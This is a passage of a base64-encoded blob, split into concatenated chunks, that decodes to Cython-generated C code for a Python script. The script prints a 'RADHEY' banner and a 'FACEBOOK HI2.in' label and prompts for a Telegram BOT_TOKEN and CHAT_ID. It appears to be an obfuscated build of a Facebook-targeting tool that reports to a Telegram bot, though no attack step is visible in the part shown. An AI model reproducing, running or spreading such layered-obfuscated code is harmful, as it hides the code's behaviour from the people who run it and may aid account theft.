2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyfTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0MsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdGVsZWdtYWlsX2NvbSkgPCAwKSBfX1BZWF9FUlIoMCwgMTQsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhf""ZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0IsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaGkyX2luKSA8IDApIF9fUFlYX0VSUigwLCAxNSwgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyKSA8IDApIF9fUFlYX0VSUigwLCAxNiwgX19weXhfTDFfZXJyb3IpCgogIAogIF9fcHl4X3RfNSA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzkybV8zOF81XzUwbV9GQUNFQk9PS19ISTJfaW59OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAxNywgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2xlZXApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMX07CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlf""VkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE4LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF80ID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQSk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3RfMn07CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzUgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVuZGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90""XzIpOwogIF9fcHl4X3RfNCA9IF9fUHl4X1B5TGlzdF9QYWNrKDIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93aGl0ZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21hZ2VudGEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gNCA6IDApXSA9IHtfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfUkFESEVZfTsKICAgIF9fcHl4X3RfNyA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoNCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDIwLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29sb3JzLCBfX3B5eF90XzQsIF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAwKSBfX1BZWF9FUlIoMCwgMjAsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWxpZ24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jZW50ZXIsIF9fcHl4X3RfNywgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAwKSBfX1BZWF9FUlIoMCwgMjAsIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZm9udCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Jsb2NrLCBfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzKzIsIDIpIDwgMCkgX19QWVhfRVJSKDAsIDIwLCBfX3B5eF9MMV9lcnJvcikKICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2JhY2tncm91bmQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ibGFjaywgX19weXhfdF83LCBfX3B5eF9jYWxsYXJncysyLCAzKSA8IDApIF9fUFlYX0VSUigwLCAyMCwgX19weXhfTDFfZXJyb3IpCiAgICBfX3B5eF90XzMgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90""XzcgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyMCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SQURIRVlfMiwgX19weXhfdF8zKSA8IDApIF9fUFlYX0VSUigwLCAyMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfNyA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkFESEVZXzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8yLCBfX3B5eF90XzR9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF83LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIyLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mZmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRUQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21z""dGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SLCBfX3B5eF90XzcpIDwgMCkgX19QWVhfRVJSKDAsIDIzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKCiAgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mZmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HUkVFTik7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDI0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0QsIF9fcHl4X3RfMykgPCAwKSBfX1BZWF9FUlIoMCwgMjQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVRfQUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSCwgX19weXhfdF83KSA8IDApIF9fUFlYX0VSUigwLCAyNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogIAogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQV8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91Xzk1bSkgPCAwKSBfX1BZWF9FUlIoMCwgMjYsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBfX3B5eF90XzMgPSBOVUxMOwogIF9fUHl4X0lOQ1JFRihfX3B5eF9idWlsdGluX2lucHV0KTsKICBf""X3B5eF90XzQgPSBfX3B5eF9idWlsdGluX2lucHV0OyAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0FfMik7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDI3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9CT1RfVE9LRU4pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAyNywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8zLCBfX3B5eF90XzJ9OwogICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI3LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogIH0KICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RPS0VOLCBfX3B5eF90XzcpIDwgMCkgX19QWVhfRVJSKDAsIDI3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKCiAgCiAgX19weXhfdF80ID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9pbnB1dCk7CiAgX19weXhfdF8yID0gX19weXhfYnVpbHRpbl9pbnB1dDsgCiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9BXzIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyOCwgX19weXhf""TDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDI4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX3B5eF90XzMgPSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQ0hBVF9JRCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDI4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICBfX3B5eF90XzYgPSAxOwogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIF9fcHl4X3RfM307CiAgICBfX3B5eF90XzcgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzIsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjgsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgfQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSUQsIF9fcHl4X3RfNykgPCAwKSBfX1BZWF9FUlIoMCwgMjgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAKICBfX3B5eF90XzIgPSBOVUxMOwogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3Rf""Myk7IF9fcHl4X3RfMyA9IDA7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9BKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfdF8zfTsKICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CgogIAogIF9fcHl4X3RfNCA9IE5VTEw7CiAgX19QeXhfSU